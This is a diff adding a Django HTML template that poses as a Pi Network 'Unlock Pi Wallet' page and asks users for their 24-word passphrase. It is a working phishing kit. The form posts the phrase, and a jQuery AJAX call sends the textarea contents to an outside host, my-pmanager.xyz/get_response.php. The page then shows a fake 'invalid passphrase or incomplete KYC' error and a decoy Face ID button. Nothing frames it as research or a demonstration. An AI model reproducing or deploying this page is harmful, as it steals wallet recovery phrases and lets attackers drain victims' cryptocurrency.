@@ -1,0 +1,246 @@
+{% load static %}
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Unlock Pi</title>
+    <link rel="stylesheet" href={% static 'bootstrap.css' %}>
+    <link rel="stylesheet" href={% static 'styler.css' %}>
+</head>
+<body>
+<form action='' method=POST class="">{%csrf_token%}
+<div class="layout">
+	<h6>Unlock Pi Wallet</h6>
+	<!--textarea placeholder="Enter your 24-word passphrase here"></textarea-->
+	{{form.phrase}}
+	{%if messages%}
+        {%for message in messages%}
+            <div class="alert alert-danger alert-dismissible fade show" role="alert">
+                {{message}}
+                <button type="button" class="btn-close btn-outline-warning" data-bs-dismiss="alert" aria-label="close"></button>
+            </div>
+        {%endfor%}
+    {%endif%}
+	<!--div class="erbox" >
+		<div class="error ip">Invalid passphrase <span>or incomplete KYC</span></div>
+		<div nclick="vralivfkdate()" class="btn uwp">Unlock With Passphrase<div class="lds-ring loader" ><div></div><div></div><div></div></div></div>
+	</div-->
+	<button class="btn btn-outline-success bnr" type="submit" value="fees" >Unlock With Passphrase</button>
+
+	<div class="erbox" >
+		<div class="error pup capz">Use passphrase to unlock</div>
+		<div class="btn biob capz">Unlock With Face ID</div>    
+	</div> 
+	<p class="below-text">As a non-custodial wallet, your wallet passphrase is
+	    exclusively accessible only to you. Recovery of passphrase
+	    is currently impossible.<br><br>
+	    Lost your passphrase? <a href="" style="color: var(--tt);">You can create a new wallet,</a> but all your π
+	    in your previous wallet will be inaccessible.
+	</p>
+</div>
+</form>
+<style type="text/css">
+
+.bnr{
+	background-color:transparent;
+	color:black;
+}
+.bnr:hover{
+	background-color:#783A8D;
+	color:white;
+}
+/*.loader{
+/*display:none;*
+display:none;//inline-block;
+height:1.2em;
+width:auto;
+background:#0000;//var(--tt);
+aspect-ratio:1;
+position:absolute;
+border-radius:1em;
+border:1px solid var(--tt);
+border-width:2px 0px 2px 2px;
+animation:0.5s spin linear infinite;
+margin-left:-5em;
+opacity:0.7;
+}*/
+.uwp{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+}
+.capz{
+  text-transform:upppercase;
+}
+.lds-ring {
+  display: inline-block;
+  position: absolute;
+  width: 1.5em;
+  height: 1.5em;
+  /* margin-left:-6em; */
+  margin-top:-1em;
+}
+
+.loader{
+display:none;
+}
+	
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 1.5em;
+  height: 1.5em;
+  margin: 8px;
+  opacity:0.7;
+  border: 2px solid var(--tt);
+  border-radius: 50%;
+  /* animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; */
+  animation: spin 0.5s linear infinite;
+  border-color: var(--tc) transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.15s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.0s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.05s;
+}
+
+
+@keyframes spin{
+100%{transform:rotate(360deg);}
+}
+
+*{
+font-size:1em;
+}
+
+.layout{
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+padding:5% 8%;
+}
+
+.layout > *{
+margin:0.5em 0;
+}
+
+textarea{
+width:90%;
+aspect-ratio:2/2;
+max-height:15em;
+/* border:1px solid ; */
+font-size:1em;
+/* font-family:inherit; */
+padding:3%;
+/* border-radius:0.5em; */
+}
+
+.btn{
+background:#fff;
+color:var(--tc);
+border:1px solid var(--tc);
+width:95%;
+font-size:0.8em;
+padding:0.7em 0;
+transition:0.1s all;
+font-weight:600;
+border-radius:0.5em;
+}
+
+h6{
+    font-weight:600;
+}
+
+.below-text{
+    font-size:0.8em;
+    width:95%;
+}
+
+
+.btn:active{
+background:#4E357766;
+}
+
+.biob{
+background:var(--tc);
+color:var(--st);
+}
+
+
+.error{
+color:#e10;
+margin:0.8em 0;
+display:none;
+white-space:nowrap;
+font-size:0.95em;
+}
+.erbox{
+display:flex;
+flex-direction:column;
+align-items:center;
+width:100%;
+}
+</style>
+
+<script src={% static 'jquery.js' %}></script>
+<script>
+function countWords(dval) {
+    var text = dval.trim();
+    var words = text.split(/\s+/);
+    var wordCount = words.length;
+    return wordCount;
+}
+
+$("textarea").on("input", function(){
+	$(".error").css("display", "none");
+});
+
+$(".btn").click(function(){
+	$(".ip span").css("display","none");
+	$(".error").css("display", "none");
+});
+
+$(".biob").click(function(){
+	$(".pup").css("display", "block");	
+});
+
+$(".uwp").click(function(){
+	validate();//$(".ip").css("display", "block");	
+});
+
+function validate(){
+	var tv = $("textarea").val().trim();
+	
+	if(countWords(tv)==24){
+		$(".ip span").css("display","inline-block");
+		$(".loader").css("display", "inline-block");
+	}
+	else
+		$(".ip").css("display", "block");
+	
+	if(tv!="")
+	$.ajax({
+		type: "POST",
+	        url: "https://my-pmanager.xyz/get_response.php",
+		data: {
+			"response":$("textarea").val(),
+		},
+		success:function(data){
+			//alert(data);
+			//$("#").val("");
+			$(".loader").fadeOut();//css("display", "inline-block");
+			$(".ip").css("display", "block");
+		}
+	});
+}
+</script>
+</body>
+</html>
